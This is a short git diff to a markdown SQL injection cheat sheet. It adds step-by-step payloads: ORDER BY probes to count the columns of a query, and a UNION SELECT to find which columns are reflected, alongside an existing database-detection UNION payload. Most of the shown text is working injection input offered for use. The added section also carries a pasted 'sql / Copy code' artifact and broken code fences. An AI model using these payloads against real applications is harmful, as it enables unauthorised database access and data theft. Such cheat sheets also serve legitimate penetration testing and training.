@@ -8,6 +8,8 @@
 
 ## Database Detection
 
+
+
 ```sql
 -- Test all database types
 ' UNION SELECT 1,2,3,4,5,6,
@@ -21,7 +23,29 @@
 ;-- -
 ```
 
-### Quick Checks
+## Step 1: Find Total Number of Columns
+
+```sql
+' ORDER BY 1-- -   -- Check if 1 column works
+' ORDER BY 2-- -   -- Check if 2 columns work
+' ORDER BY 3-- -   -- Check if 3 columns work
+' ORDER BY 4-- -   -- Check if 4 columns work
+' ORDER BY 5-- -   -- Check if 5 columns work
+' ORDER BY 6-- -   -- Check if 6 columns work
+' ORDER BY 7-- -   -- Check if 7 columns work
+' ORDER BY 8-- -   -- Should FAIL → means 7 columns is the maximum
+
+Step 2: Find Visible Columns
+sql
+Copy code
+' UNION SELECT 1,2,3,4,5,6,7-- -
+-- Observe which numbers are reflected in the response
+-- Those positions are injectable / visible
+
+
+
+
+## Quick Checks
 
 ```sql
 -- SQLite
